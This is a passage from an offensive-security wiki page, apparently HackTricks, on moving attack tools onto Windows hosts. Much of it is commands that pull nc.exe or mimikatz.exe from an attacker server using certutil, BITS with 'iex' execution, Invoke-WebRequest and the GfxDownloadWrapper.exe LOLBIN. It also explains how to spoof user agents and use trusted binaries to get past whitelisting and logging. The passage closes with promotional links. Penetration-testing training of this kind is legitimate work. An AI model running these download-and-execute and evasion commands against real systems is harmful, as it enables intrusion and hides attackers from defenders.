User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

### Certutil - Client

```bash
certutil -urlcache -split -f http://10.10.10.32/nc.exe 
certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Certutil - Server

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

### BITS - Client

```powershell
Import-Module bitstransfer;
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
$r=gc $env:temp\t;
rm $env:temp\t; 
iex $r
```

#### BITS - Server

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

# Evading Detection
## Changing User Agent
If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome...

 Listing out User Agents:
 ```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```
Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
## LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries". An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

 Transferring File with GfxDownloadWrapper.exe
 ```pwershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
Such a binary might be permitted to run by application whitelisting and be excluded from alerting.

Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
